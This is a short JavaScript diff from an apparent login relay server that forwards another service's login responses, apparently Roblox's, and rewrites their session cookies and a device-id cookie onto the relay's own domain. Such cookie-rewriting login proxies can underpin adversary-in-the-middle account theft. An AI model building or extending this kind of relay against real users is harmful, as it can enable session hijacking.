@@ -290,14 +290,23 @@ async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 3
 }
 
 function forwardLoginResponse(res, result, host, origin, deviceId) {
-    const cleanHost = host.replace(/^www\./, '');
+    // Use origin header domain for cookies — prevents raw IP (.43.98.240.240)
+    // cookie domain bug when Challenge.js retries login via server IP directly
+    let cookieDomain = host;
+    if (origin && origin.startsWith('https://')) {
+        const originHost = origin.replace('https://', '').split('/')[0];
+        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
+            cookieDomain = originHost;
+        }
+    }
+    const cleanHost = cookieDomain.replace(/^www\./, '');
     setCors(res, origin);
 
     for (const h of ['x-csrf-token', 'content-type', 'cache-control', ...CHALLENGE_HEADERS]) {
         if (result.headers[h]) res.set(h, result.headers[h]);
     }
 
-    let cookies = rewriteCookies(result.headers['set-cookie'], host) || [];
+    let cookies = rewriteCookies(result.headers['set-cookie'], cookieDomain) || [];
     if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
     if (cookies.length) res.set('Set-Cookie', cookies);
 
